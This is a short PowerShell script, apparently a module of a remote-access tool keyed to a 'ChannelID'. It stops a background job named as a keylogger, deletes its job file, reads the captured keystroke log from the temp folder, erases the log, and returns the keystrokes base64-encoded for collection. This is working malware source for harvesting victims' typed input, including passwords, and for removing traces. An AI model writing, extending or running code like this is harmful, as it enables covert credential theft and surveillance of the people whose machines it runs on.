param($args)

$channelID = $env:ChannelID
$logFile = "$env:TEMP\keylog_$channelID.txt"
$jobName = "Keylogger_$channelID"

# Stop and remove the job
$job = Get-Job -Name $jobName -ErrorAction SilentlyContinue
if ($job) {
    Stop-Job $job
    Remove-Job $job
}

# Clean up job ID file
Remove-Item "$env:TEMP\keylog_job_$channelID.txt" -Force -ErrorAction SilentlyContinue

Start-Sleep -Seconds 1

# Read and return the log file
if (Test-Path $logFile) {
    $content = Get-Content $logFile -Raw
    Remove-Item $logFile -Force
    if ($content) {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($content)
        [System.Convert]::ToBase64String($bytes)
    } else {
        "No keystrokes recorded."
    }
} else {
    "Keylogger not running."
}